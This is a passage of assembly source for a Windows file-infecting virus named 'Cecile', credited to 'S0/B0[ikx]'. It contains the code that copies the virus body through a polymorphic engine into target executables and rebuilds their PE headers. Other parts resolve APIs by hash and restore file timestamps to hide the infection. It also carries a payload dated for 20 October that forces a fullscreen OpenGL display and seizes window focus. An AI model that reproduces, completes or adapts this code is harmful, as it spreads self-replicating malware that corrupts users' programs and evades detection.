    instruction  SGDT    , Mem64   , NULL   , 0000000100000000b , 32,  0, 16,  0, 21,  0,  0
    instructionb SIDT    , Mem64   , NULL   , 0000000100001000b , 32,  0, 16,  0, 21,  0,  0
    instructionb LGDT    , Mem64   , NULL   , 0000000100010000b , 32,  0, 16,  0, 21,  0,  0
    instructionb LIDT    , Mem64   , NULL   , 0000000100011000b , 32,  0, 16,  0, 21,  0,  0
    instructionb CMPXCHG8, Mem64   , NULL   , 1100011100001000b , 32,  0, 16,  0, 21,  0,  0

    instruction  LFS     , Reg16   , Mem32  , 1011010000000000b , 32,  0, 16, 18, 21,  0,  0
       variance            Reg32   , Mem64  , 1011010000000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb LGS     , Reg16   , Mem32  , 1011010100000000b , 32,  0, 16, 18, 21,  0,  0
       varianceb           Reg32   , Mem64  , 1011010100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb LSS     , Reg16   , Mem32  , 1011001000000000b , 32,  0, 16, 18, 21,  0,  0
       varianceb           Reg32   , Mem64  , 1011001000000000b , 32,  0, 16, 18, 21,  0,  0

    instruction  LLDT    , Mem16   , NULL   , 0000000000010000b , 32,  0, 16,  0, 21,  0,  0
    instructionb LMSW    , Mem16   , NULL   , 0000000100110000b , 32,  0, 16,  0, 21,  0,  0
    instructionb LTR     , Mem16   , NULL   , 0000000000011000b , 32,  0, 16,  0, 21,  0,  0

    instruction  SHLD    , MemWord , RegWIm8, 1010010000000000b , 32,  0, 16, 18, 21,  0,  0
       variance            MemWord , RegWCl , 1010010100000000b , 32,  0, 16, 18, 21,  0,  0
    instructionb SHRD    , MemWord , RegWIm8, 1010110000000000b , 32,  0, 16, 18, 21,  0,  0
       varianceb           MemWord , RegWCl , 1010110100000000b , 32,  0, 16, 18, 21,  0,  0

    instruction  SLDT    , Mem16   , NULL   , 0000000000000000b , 32,  0, 16,  0, 21,  0,  0
    instructionb SMSW    , Mem16   , NULL   , 0000000100100000b , 32,  0, 16,  0, 21,  0,  0
    instructionb STR     , Mem16   , NULL   , 0000000000001000b , 32,  0, 16,  0, 21,  0,  0
    instructionb VERR    , Mem16   , NULL   , 0000000000100000b , 32,  0, 16,  0, 21,  0,  0
    instructionb VERW    , Mem16   , NULL   , 0000000000101000b , 32,  0, 16,  0, 21,  0,  0

    instruction  SETcc   , Mem8    , NULL   , 1001000000000000b , 32,  0, 16,  0, 21,  0, 12
    instruction  INVLPG  , Mem     , NULL   , 0000000100111000b , 32,  0, 16,  0, 21,  0,  0

    instruction  CMOVcc  , Reg     , Mem    , 0100000000000000b , 32,  0, 16, 18, 21,  0, 12

    db -1

   updatecode:

   push    ebx
   push    ecx
   push    edx
   push    esi
   push    edi

   push    eax

   pushad
   getval  virusbank

   mov ecx,eax
   ISyscall    LoadBankInfoIt          ; Should be a system call
   mov edi,eax
   mov dword ptr [esp+20h],eax

   getval  valuefill
   add eax,edi
   mov dword ptr [esp+20h-4],eax
   popad

   mov dword ptr [eax+8], offset I_Init-InfectStart    ; set the image
   mov ecx,dword ptr [edi+52]
   mov dword ptr [eax+12], ecx
   mov dword ptr [eax], offset I_Fini-InfectStart

   getval      virsize         ; set virus size
   mov     edx,eax

   getval      dropplace       ; and drop place
   mov     ebp,eax

   mov     eax,esi
   pop     esi
   push        esi
   push        eax
   push        edi

   xor     ebx,ebx
   mov     ecx,244

   getseedvalue:

   xor     ebx,dword ptr [edi]
   ror     ebx,1

   inc     edi
   loop        getseedvalue

   mov     ecx,edx

   ISyscall    PolyMorphising      ; pass all that to the polymorphic

   pop     edi
   pop     esi
   mov     edi,dword ptr [edi-6]
   add     edi,esi
   pop     esi

   repz        movsb           ; repz from bank to file

   pop     edi
   pop     esi
   pop     edx
   pop     ecx
   pop     ebx

   ret

   ;
   ; put here how the file should be updated
   ;

   RVA2Offset:

   push    ebx
   push    ecx
   push    edx

   movzx   ecx,word ptr [edi+6]

   getnextone:

   mov ebx,dword ptr [edx+12]
   cmp eax,ebx
   jb  getnext

   add ebx,dword ptr [edx+8]
   dec ebx

   cmp eax,ebx
   ja  getnext

   sub eax,dword ptr [edx+12]
   add     eax,dword ptr [edx+20]

   pop edx
   pop ecx
   pop ebx

   ret

   getnext:

   add edx,40

   loop    getnextone

   pop edx
   pop ecx
   pop ebx

   ret

   RebuildLoaded:

   push    eax
   push    ecx
   push    edx

   mov dword ptr [edi+28],0
   mov dword ptr [edi+32],0
   mov dword ptr [edi+36],0

   movzx   ecx,word ptr [edi+6]

   thatgatat:

   mov eax,dword ptr [edx+16]

   bt  dword ptr [edx+36],5
   jnc dontaddcodedata

   add dword ptr [edi+28],eax

   dontaddcodedata:

   bt  dword ptr [edx+36],6
   jnc dontaddinitdata

   add dword ptr [edi+32],eax

   dontaddinitdata:

   bt  dword ptr [edx+36],7
   jnc dontadduninitdata

   push    ecx
   push    edx

   mov eax,dword ptr [edx+8]
   xor edx,edx
   mov ecx,dword ptr [edi+60]
   div ecx
   inc eax
   mul ecx

   add dword ptr [edi+36],eax

   pop edx
   pop ecx

   dontadduninitdata:

   add edx,40

   loop    thatgatat

   pop edx
   pop ecx
   pop eax

   ret


   goaway5:

   pop     eax
   I_apicall    03D60E5B1h,0           ; UnmapViewOfFile
   I_apicall    0F8F846CCh,0           ; CloseHandle

   pop     eax
   push    eax

   lea edx,[esp+4+4+12+(5*4)]
   push    edx
   lea edx,[esp+4+4+12+(4*4)]
   push    edx
   lea edx,[esp+4+4+12+(3*4)]
   push    edx

   push    eax
   I_apicall    03508B12Bh,0           ; SetFileTime

   I_apicall    0F8F846CCh,0           ; CloseHandle

   pop     eax
   add     esp,512+12
   jmp wefinished

   ResizeAndRemap:

   pushad

   push    eax
   mov edx,esp

   gogetagain:
   add edx,4

   cmp dword ptr [edx],esi
   jne gogetagain

   mov ebx,esi
   neg ebx

   cmp dword ptr [edx-4],ebx
   jne gogetagain

   pop eax

   push    edx
   push    eax
   push    edx

   push    esi
   I_apicall    03D60E5B1h,0           ; UnmapViewOfFile

   pop edx                 ; save the handles
   mov eax,dword ptr [edx+4]           ; load mapping handle

   push    edx

   push    eax
   I_apicall    0F8F846CCh,0           ; CloseHandle
   pop edx

   pop eax                 ; load size
   mov ebx,dword ptr [edx+4+4]     ; load file handle

   sub esp,12
   mov edx,esp
   mov dword ptr [edx],12
   mov dword ptr [edx+4],0
   mov dword ptr [edx+8],0

   push    0
   push    eax
   push    0
   push    4
   push    edx
   push    ebx
   I_apicall    97E2AF98h,0            ; CreateFileMappingA

   add esp,12

   pop edx
   mov dword ptr [edx+4],eax           ; save the handle

   push    edx

   push    0
   push    0
   push    0
   push    000F001Fh
   push    eax
   I_apicall    3D547DB1h,0            ; MapViewOfFile

   pop edx
   mov dword ptr [edx],eax         ; save map handle
   neg eax
   mov dword ptr [edx-4],eax           ; and neg it
   neg     eax

   mov dword ptr [esp+4],eax
   popad
   ret

   wefinished:

   popad
   getval          error
   pop             ebp
   fini_m0:
   ret

   SFCLib:         db      'SFC.DLL',0

   ISyscall0:      db      68h
   InfectSyscall:  dd      offset RoutineHandler
                   ret

   InfectEnd:

   ;
   ; Polymorphic module
   ;

   PolyStart:

   dd      offset PolyEnd - PolyStart
   db  1                   ; workable system
   db      1                   ; workable infection
   dd  PolySyscall - PolyStart
   dd      Polyroutine - PolyStart

   PSyscall    macro       I_ID_CoDE

           mov     dword ptr [esp-12], I_ID_CoDE
           call        PSyscall0
   endm

   Polyroutine:

   push    ecx
   push    edx

   xor edx,edx
   mov eax,dword ptr [ebp]
   mov ecx,714024
   div ecx

   mov ebx,eax

   pop edx
   pop ecx

   push    ebp
   loadpointer ebp,seed,poly24
   mov dword ptr [ebp],ebx
   pop ebp

   mov ebp,dword ptr [ebp+4]

   push    esi
   push    edi

   mov byte ptr [edi],0CCh

   inc edi
   inc ebp
   call    poly

   pop esi
   pop edi

   inc ecx

   ret

   include poly.asm

   PSyscall0:      db      68h
   PolySyscall:    dd      0
                   ret
   PolyEnd:

   ;
   ; Cool payload module, well this is a inc file container wich contain the asm
   ; file
   ;
   ; note that this file contain the Fast api call calling wich is a cache memory
   ; for api call, instead of each time recalculation, it's a pointer to a pointer
   ; to a junk buffer, as a small stack memory is passed to ecx, wich can
   ; accelerate many times api processing, what can be quite interresting for
   ; graphical payload as exemple.
   ;

   PayloadStart:

   dd      offset PayloadEnd - PayloadStart    ; module size
   db  1                   ; workable system
   db      1                   ; workable payload version
   dd      PayloadSyscall - PayloadStart       ; External call
   dd      Payloadroutine - PayloadStart       ; entrypoint relative


   PSyscall        macro           I_ID_CoDE

           mov     dword ptr [esp-12], I_ID_CoDE
                   call            PiSyscall0
   endm

   P_apicall       macro           crcval, libhandle

           mov     edx,libhandle
           mov     eax,crcval
                   PSyscall        MApiCall

           endm

   FP_apicall      macro           crcval, libhandle, lpval

           loadpointer ecx, Papindirected , &lpval&
           mov     edx,libhandle
           mov     eax,crcval
                   PSyscall        FApiCall

           endm


   Payloadroutine:

   pushad

   sub     esp,16

   mov ebx,esp

   push    ebx
   push    ebx

   P_apicall   0B50DB39h,0

   pop ebx

   cmp word ptr [ebx+6],20         ; in memory of cecile,
   jne skippayload             ; all started 20 octobre...

   cmp word ptr [ebx+2],10
   jne skippayload

   pushfl      macro   float1, f2

           call    &f2&_getme1
   &f2&_getme1:    pop ebx
           fld qword ptr [ebx+&f2&_load-&f2&_getme1]
           sub esp,8
           fstp    qword ptr [esp]
           jmp &f2&_end

   &f2&_load:  dq  &float1&

   &f2&_end:

   endm

   ;   int     3

       loadpointer edx,opengldll,pp4
       mov     ecx,1
       mov     eax,7
       PSyscall    LoadLib

       cmp     eax,0
       je      finishpayit

       loadpointer edx,gdi32dll,pp5
       mov     ecx,1
       mov     eax,8
       PSyscall    LoadLib

       cmp     eax,0
       je      finishpayit

       loadpointer edx,glu32dll,pp6
       mov     ecx,1
       mov     eax,9
       PSyscall    LoadLib

       cmp     eax,0
       je      finishpayit

       sub esp,12
       mov edx,esp
       mov dword ptr [edx],12
       mov dword ptr [edx+4],0
       mov dword ptr [edx+8],0

           loadpointer     ebx,InitPayloadThread, i22

       push        eax
       push        esp
       push        0
       push        0
       push        ebx
       push        0
       push        edx
       P_apicall   0CA2C0A90h,0            ; Create Thread

       add     esp,12

           pop             eax

       finishpayit:

           jmp             PayCallExit

   opengldll:      db  'OPENGL32.DLL',0
   gdi32dll:       db  'GDI32.DLL',0
   glu32dll:       db  'GLU32.DLL',0

   Papindirected:      db  0

   InitPayloadThread:

   loadpointer ebx,Papindirected,ipt

   mov     ecx,32*8
   sub     esp,ecx
   mov     dword ptr [ebx],esp
   mov     edi,esp
   xor     eax,eax
   repz        stosb

   ;push       10000
   ;P_apicall  3126C0h,0                   ; Sleep

   xor     ebp,ebp

   push        0
   P_apicall       1017D1A1h,0,k           ; GetModuleHandle

   push        ebp
   mov     edx,esp

   sub     esp,4

   mov     dword ptr [esp], 'ALC'
   mov     ebx,esp

   sub     esp,40
   mov     dword ptr [esp],0
   lea     ecx,[ebp+WindowProc]
   mov     dword ptr [esp+4],ecx
   mov     dword ptr [esp+8],0
   mov     dword ptr [esp+12],0
   mov     dword ptr [esp+16],eax
   mov     dword ptr [esp+20],0
   mov     dword ptr [esp+24],0
   mov     dword ptr [esp+28],0
   mov     dword ptr [esp+32],0
   mov     dword ptr [esp+36],ebx

   mov     ecx,esp

   push        ebx
   push        eax
   push        ecx
   P_apicall       0D48A96AAh,1            ; RegisterClassA
   pop     eax
   pop     ebx

   pushad

   ;int        3

   mov     ecx,148

   sub     esp,ecx
   mov     edi,esp
   xor     eax,eax

   repz        stosb

   mov     dword ptr [esp+32+2+2],148  ; dmSize

   mov     dword ptr [esp+104],16      ; dmBitsPerPel
   mov     dword ptr [esp+108],640     ; dmWidth
   mov     dword ptr [esp+112],480     ; dmHeight

   mov     dword ptr [esp+40],1C0000h  ; set dmFields =
               ; DM_BITSPERPEL | DM_PELSWIDTH | DM_PELSHEIGHT

   mov     edx,esp
   push        4               ; CDS_FULLSCREEN
   push        edx             ; dmScreenSettings
   P_apicall       56C779B2h,1     ; ChangeDisplaySettingsA

   add     esp,148

   push        0
   P_apicall       7F2EA568h,1         ; ShowCursor

   popad

   sub     esp,4
   mov     dword ptr [esp], 'LGO'
   mov     ebp,esp

   push        0
   push        eax
   push        0
   push        0
   push        480
   push        640
   push        0
   push        0
   push        90020000h
   push        ebp
   push        ebx
   push        0400000h
   P_apicall       7099FB9Ch,1         ;   CreateWindowExA

   add     esp,40
   pop     esp
   pop     ebp

   mov     edx,esp
   push        edx

   sub     esp,44
   mov     ebx,esp

   DoMLoop:

   push        eax
   push        ebx

   push        0
   push        0
   push        eax
   push        ebx
   P_apicall       3BAC79F3h,1             ; GetMessageA

   cmp     eax,0
   jne     dontfixit

   dontfixit:

   pop     ebx
   pop     eax

   je      finishMLoop

   push        eax
   push        ebx

   push        ebx
   P_apicall       50D9920Ch,1         ; TranslateMessage

   pop     ebx
   push        ebx

   push        ebx
   P_apicall       5BFFA45Ch,1         ; DispatchMessageA

   pop     ebx
   pop     eax

   jmp     DoMLoop

   finishMLoop:

   lea     esp,[ebx+44]
   pop     esp

   ;push       0
   ;call       ExitProcess

   ret                 ; Thread return

   WindowProc:

   lpamval     equ 16
   wpamval     equ 12
   umsgval     equ 8
   hwndval     equ 4

   cmp dword ptr [esp+umsgval],86h         ; WM_NCACTIVE
   je  gogoawayme

   cmp dword ptr [esp+umsgval],6h          ; WM_ACTIVATE
   jne skipcreat

   ; Cecile, three week passed, I'm crying the news I don't have, I'm crying
   ; the love I don't have, I'm crying the passion u don't have, Cecile, you
   ; are so far I don't want anything much from your part...

   gogoawayme:

   pushad
   push    dword ptr [esp+20h+hwndval]
   P_apicall   0A74E296Ch,1                ; SetForegroundWindow

   push    dword ptr [esp+20h+hwndval]
   P_apicall   619AD6D8h,1             ; SetFocus

   push    dword ptr [esp+20h+hwndval]
   P_apicall   0CC447A6Eh,1                ; SetActiveWindow

   popad

   xor eax,eax
   ret 16

   skipcreat:

   ;cmp    dword ptr [esp+umsgval],10h         ; WM_CLOSE
   ;jne    skipQuitting
   ;
   ;quitting:
   ;
   ;push   0
   ;call   PostQuitMessage
   ;xor    eax,eax
   ;ret    16

   skipQuitting:

   cmp dword ptr [esp+umsgval],01h
   jne SkipCreating

   ;int    3

   push    dword ptr [esp+hwndval]
   FP_apicall  002ACB18h,1,k282                ; GetDC

   sub esp,40

   mov edx,eax

   mov edi,esp                 ; Create the pixel format
   xor eax,eax                 ; descriptor
   mov ecx,40
   repz    stosb

   mov eax,edx

   mov word ptr [esp],40           ; fill open gl size
   mov word ptr [esp+2],1          ; fill the version
   mov dword ptr [esp+4],37            ; support opengl + draw window
                           ; + double buff
   mov byte ptr [esp+9],16         ; Color bit
   mov byte ptr [esp+17],16            ; Depth bit

   mov ecx,esp

   push    ecx             ; ecx = *pfd
   push    eax             ; eax = the DC

   push    ecx             ;
   push    eax             ;
   P_apicall   7667726Eh,8         ; ChoosePixelFormat

   cmp eax,0
   pop ebx             ; ebx = DC
   pop ecx             ; ecx = *pfd
   je  fixstackandExit

   push    ebx

   push    ecx
   push    eax             ; eax = pixelformat
   push    ebx
   FP_apicall  073D91C5Eh,8,k321       ; SetPixelFormat
                       ; we setted pixel format :)
   cmp eax,0
   pop eax
   je  fixstackandExit

   push    eax
   push    eax
   FP_apicall  4FE0E526h,7,k329    ; wglCreateContext
                       ; setting open gl context
   cmp eax,0
   pop ebx
   je  fixstackandExit

   push    eax
   push    ebx
   FP_apicall  07772016h,7,k337        ; wglMakeCurrent
                       ; set our open gl context
   ;push   0BE2h
   ;call   glEnable            ; enable blending

   push    0B57h
   FP_apicall  075D1F228h,7,k343   ; glEnable
                       ; enable material coloration
   push    0B50h
   FP_apicall  075D1F228h,7,k346   ; glEnable
                       ; enable ligthing
   push    4000h
   FP_apicall  075D1F228h,7,k349   ; glEnable
                       ; enable light 1
   add esp,40

   xor eax,eax
   ret 16

   fixstackandExit:

   add esp,40

   push    0
   P_apicall   07818C6Bh,1             ; PostQuitMessage
   xor eax,eax
   ret 16

   SkipCreating:

   cmp dword ptr [esp+umsgval],05h         ; WM_SIZE
   jne skipResizing

   mov eax,dword ptr [esp+lpamval]

   mov edx,eax
   ror edx,16
   movzx   ecx,dx
   ror edx,16
   and edx,0FFFFh

   push    ecx
   push    edx
   push    0
   push    0
   FP_apicall  084F77E3Dh,7,k382           ; glViewport

   push    01701h
   FP_apicall  0CC25D186h,7,k385           ; glMatrixMode

   FP_apicall  0B7550A81h,7,k387           ; glLoadIdentity

   ; glu perspective

   pushfl  250.000001,d1
   pushfl  1.000001,d2
   pushfl  1.6,d3
   pushfl  45.00001,d4

   P_apicall   052CF8CB5h,9                ; gluPerspective
                               ; me the conversion
   push    01D01h
   P_apicall   06F425C00h,7                ; glShadeModel

   xor eax,eax
   ret 16

   skipResizing:

   cmp dword ptr [esp+umsgval],0Fh         ; WM_PAINT
   jne skipPaint

   push    4100h
   P_apicall   0EB925D0h,7             ; glClear

   push    01700h
   P_apicall   0CC25D186h,7                ; glMatrixMode

   P_apicall   0B7550A81h,7                ; glLoadIdentity

   pushfl  1.00001,c1
   mov ecx,5

   makeit:
   push    0
   push    0
   loop    makeit

   mov ecx,3

   makethat:
   pushfl  10.00001,c7
   loop    makethat

   P_apicall   0B40F59E3h,9                    ; gluLookAt

   call    getNear
   getNear:    pop ebx
           lea ebx,[ebx+LightPosition-getNear]

   push    ebx
   push    01203h
   push    4000h
   FP_apicall  0AF5F0533h,7,k440               ; glLightfv

           call    drawme1
   drawme1:    pop ebx

           lea edx,[ebx+drawme-drawme1]
           push    edx

           push    0
           push    0

           push    0
           push    0

           fld qword ptr [edx+8+8+8+8]
           sub esp,8
           fstp    qword ptr [esp]

           fld qword ptr [edx+8*7]
           sub esp,8
           fstp    qword ptr [esp]

           FP_apicall  0B03D1463h,7,k462       ; glRotated
   ;
   ;       push    01202h
   ;       push    0408h
   ;       call    glColorMaterial
   ;
           pop edx
           push    edx

           fld qword ptr [edx+8+8+8+8+8]
           fadd    qword ptr [edx+8+8+8+8]
           fstp    qword ptr [edx+8+8+8+8+8]

           fld qword ptr [edx+6*8]
           sub esp,8
           fstp    qword ptr [esp]

           fld qword ptr [edx+4*8]
           sub esp,8
           fstp    qword ptr [esp]

           fld qword ptr [edx+4*8]
           sub esp,8
           fstp    qword ptr [esp]

           fld qword ptr [edx+4*8]
           sub esp,8
           fstp    qword ptr [esp]

           FP_apicall  0AE59E423h,7,k491       ; glColor4d

           push    7                   ; GL_QUADS
           FP_apicall  0EB83BB0h,7,k494        ; glBegin

           pop edx

           mov dword ptr [edx],0   ; reset X coordinates
           mov dword ptr [edx+4],0

   ; taaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaam

   ;       int 3

           fld qword ptr [edx-(3*8)]
           fadd    qword ptr [edx-(6*8)]
           fstp    qword ptr [edx-(3*8)]

           fld qword ptr [edx-(2*8)]
           fadd    qword ptr [edx-(5*8)]
           fstp    qword ptr [edx-(2*8)]

           fld qword ptr [edx-(1*8)]
           fadd    qword ptr [edx-(4*8)]
           fstp    qword ptr [edx-(1*8)]

           mov ecx,3
   DrawAll2:
           push    ecx

           mov dword ptr [edx+calcpos-drawme],0

           mov dword ptr [edx+8],0
           mov dword ptr [edx+8+4],0

           mov ebx,3
           sub ebx,ecx

           mov ecx,9
   DrawAll1:   push    ecx

           fld qword ptr [edx+(ebx*8)-(3*8)]
           fstp    qword ptr [edx+8+8]

   ;       mov dword ptr [edx+8+8],0
   ;       mov dword ptr [edx+8+8+4],0

           mov ecx,456
   DrawAll:
           push    ecx

           call    DrawCarre

           fld qword ptr [edx+8+8]
           fsub    qword ptr [edx+8+8+8+8]
           fstp    qword ptr [edx+8+8]

           pop ecx
           loop    DrawAll

           fld qword ptr [edx+8]
           fsub    qword ptr [edx+8+8+8+8]
           fstp    qword ptr [edx+8]

           pop ecx

           loop    DrawAll1

           fld qword ptr [edx]
           fsub    qword ptr [edx+8+8+8+8]
           fstp    qword ptr [edx]

           pop ecx
           loop    DrawAll2

   FP_apicall  03AE8A0h,7,k566             ; glEnd

   push    dword ptr [esp+hwndval]
   FP_apicall  02ACB18h,1,k569             ; GetDC

   push    eax
   FP_apicall  0424E4ADFh,8,k572           ; SwapBuffers

   xor eax,eax
   ret 16

   skipPaint:

   push    dword ptr [esp+lpamval]
   push    dword ptr [esp+4+wpamval]
   push    dword ptr [esp+4+4+umsgval]
   push    dword ptr [esp+4+4+4+hwndval]
   FP_apicall  023ED6274h,1,k583           ; DefWindowProcA

   ret     16

   DrawCarre:

   call    testpos
   cmp     eax,0
   je      Drawcasse

   ret

   Drawcasse:

   push    edx

   fld qword ptr [edx]             ; Z coord
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8]           ; Y coord
   fadd    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8+8]         ; X coord
   fsub    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]
   FP_apicall  084A94FFDh,7,k612       ; glVertex3d

   pop edx
   push    edx

   fld qword ptr [edx]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8]
   fadd    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8+8]
   fadd    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]
   FP_apicall  084A94FFDh,7,k630           ; glVertex3d

   pop edx
   push    edx

   fld qword ptr [edx]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8]
   fsub    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8+8]
   fadd    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]
   FP_apicall  084A94FFDh,7,k648               ; glVertex3d

   pop edx
   push    edx

   fld qword ptr [edx]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8]
   fsub    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]

   fld qword ptr [edx+8+8]
   fsub    qword ptr [edx+8+8+8]
   sub esp,8
   fstp    qword ptr [esp]
   FP_apicall  084A94FFDh,7,k666               ; glVertex3d

   pop edx
   ret

   testpos:

   ;int     3

   pushad

   call    gettest
   gettest:
   pop     ebx
   lea     ebx,[ebx+calcpos-gettest]

   mov     edx,dword ptr [ebx]
   inc dword ptr [ebx]
   mov     ecx,edx

   shr     edx,3
   mov     eax,dword ptr [ebx+4+edx]

   and     ecx,0111b

   ror     eax,cl
   and     eax,1

   mov     dword ptr [esp+20h-4],eax
   popad

   ret


   drawmme:    dq  0.125
           dq  0.25
   drawspeed:  dq  0.5

   drawthat:   dq  0
           dq  0
           dq  0

   drawme:     dq  0
           dq  0
           dq  0
           dq  0.50
           dq  1.0

   rotated:    dq  1.0
           dq  0.95

           dq  180.0

   LightPosition:  dd  5
           dd  0
           dd  0
           dd  50.00001

           dd  0.5
           dd  0
           dd  1
           dd  0

   calcpos:        dd      0

   drawtext:

    db 07fh, 017h, 080h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 00fh, 040h, 0f7h, 0bfh, 02ah, 0e2h
    db 0ffh, 07fh, 0fch, 0ffh, 0cfh, 0ffh, 0ffh, 07fh, 0feh, 0ffh, 0ffh, 0efh
    db 0f9h, 0dfh, 0ffh, 0f3h, 0efh, 063h, 010h, 0ffh, 08fh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 03fh, 0a2h, 0eah, 0ffh, 005h, 0e0h, 0dfh, 0bfh, 0fbh
    db 0ffh, 0deh, 0ffh, 0dfh, 0ffh, 0feh, 0ffh, 0ffh, 0efh, 0feh, 0e3h, 0ffh
    db 0edh, 0f1h, 0fdh, 07dh, 0ffh, 07fh, 0ffh, 0ffh, 0ffh, 0e3h, 0ffh, 0f7h
    db 0bfh, 0ffh, 09fh, 0ffh, 07fh, 07fh, 0feh, 0feh, 0ffh, 0ffh, 0ffh, 01fh
    db 0fah, 09fh, 0ffh, 0ffh, 0ffh, 0e7h, 03eh, 0efh, 0ffh, 0ffh, 0ffh, 0ffh
    db 03fh, 000h, 0fdh, 0afh, 0aah, 0f0h, 08fh, 0dfh, 01fh, 0e7h, 0dfh, 0f1h
    db 08fh, 0ffh, 09eh, 0fch, 087h, 0f7h, 0e1h, 0e5h, 0ffh, 0ddh, 0f2h, 0fdh
    db 07dh, 0fbh, 0beh, 03fh, 0f0h, 0ffh, 0fdh, 0ffh, 0f7h, 0bfh, 0ffh, 0efh
    db 0ffh, 07fh, 0bfh, 0ffh, 0feh, 0ffh, 0ffh, 0ffh, 0efh, 0eah, 0bfh, 0ffh
    db 0ffh, 0ffh, 0efh, 07fh, 0f7h, 0ffh, 0ffh, 0ffh, 0ffh, 07fh, 0a8h, 0aah
    db 07fh, 017h, 0f0h, 007h, 0dfh, 0efh, 0dah, 0deh, 0eeh, 007h, 0ffh, 0b8h
    db 0fdh, 0ffh, 0bfh, 0dfh, 0eah, 0f1h, 061h, 0f5h, 0feh, 07eh, 05dh, 0bfh
    db 0ffh, 0ffh, 0ffh, 0ddh, 0cch, 074h, 03fh, 0f3h, 0cbh, 075h, 04eh, 0beh
    db 067h, 0c6h, 0f4h, 07fh, 0f8h, 07fh, 0f3h, 03dh, 067h, 0f2h, 099h, 0cdh
    db 066h, 0d7h, 053h, 033h, 0ffh, 0e1h, 07fh, 040h, 0f7h, 0bfh, 02ah, 0f2h
    db 08fh, 0dfh, 00fh, 0fbh, 0deh, 0f0h, 08fh, 0ffh, 076h, 07ch, 0f8h, 0dfh
    db 0dfh, 0f4h, 0ffh, 05eh, 0fah, 0feh, 0beh, 0beh, 0dfh, 0feh, 0c0h, 0ffh
    db 063h, 047h, 064h, 0beh, 0ebh, 0bdh, 0aah, 076h, 0dfh, 0abh, 046h, 0c7h
    db 0ffh, 0ffh, 07fh, 0b9h, 0beh, 022h, 0e2h, 0aeh, 0aeh, 0d6h, 087h, 051h
    db 0d1h, 0ffh, 0ffh, 07fh, 0a2h, 0eah, 0ffh, 005h, 0e0h, 0dfh, 0bfh, 0ebh
    db 0fbh, 0deh, 0feh, 0dfh, 0ffh, 0d6h, 0fdh, 0ffh, 0dfh, 0efh, 0f8h, 07fh
    db 06fh, 07ch, 07fh, 0bfh, 05dh, 0dfh, 0feh, 0ffh, 0ffh, 06eh, 077h, 0f7h
    db 0bdh, 0ebh, 0bdh, 0aah, 076h, 0dfh, 0aah, 076h, 0dfh, 0ffh, 0ffh, 0bfh
    db 075h, 03fh, 0bah, 0ebh, 0aeh, 08eh, 0d6h, 0dfh, 05dh, 0ddh, 0ffh, 0ffh
    db 03fh, 000h, 0fdh, 0afh, 0aah, 0e0h, 0ffh, 07fh, 01ch, 006h, 0a1h, 0e1h
    db 0ffh, 0ffh, 030h, 0feh, 0ffh, 03fh, 070h, 0ffh, 03fh, 0b0h, 0ffh, 018h
    db 0d8h, 0ebh, 062h, 0ffh, 0ffh, 0ffh, 071h, 0cfh, 04ch, 07eh, 0e6h, 0c3h
    db 06eh, 0f5h, 03eh, 023h, 04dh, 0c7h, 0ffh, 0ffh, 0cfh, 0aeh, 0beh, 066h
    db 0e2h, 0ceh, 0a9h, 0d5h, 0dfh, 0b3h, 0d3h, 0ffh, 0ffh, 03fh, 0a8h, 0aah
    db 07fh, 017h, 080h, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0fdh, 0ffh, 0fbh, 0ffh, 0ffh
    db 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 0ffh, 00fh, 040h, 0f7h

   PayCallExit:

   ;include         payload\payload.asm

   skippayload:

   add esp,16

   popad
   ret

   paytext:

   db              'To see a world in a grain of sand',13,10
   db              'And heaven in a flower',13,10
   db              'Hold infinite in the palm of your hand',13,10
   db              'And eternity in a hour...',13,10,13,10,13,10
   db              '                   A kiss to cecile...   ',0

   paytitle:

   db      'Cecile coded by S0/B0[ikx], made in assembly',0

   PiSyscall0:      db      68h
   PayloadSyscall: dd      offset RoutineHandler
                   ret
   PayloadEnd:

   ;
   ; Net module encapsulater
   ;

   CommodStart:

   dd      offset CommodEnd - CommodStart
   db  1                   ; workable system
   db      1                   ; workable payload version
   dd      CommodSyscall - CommodStart
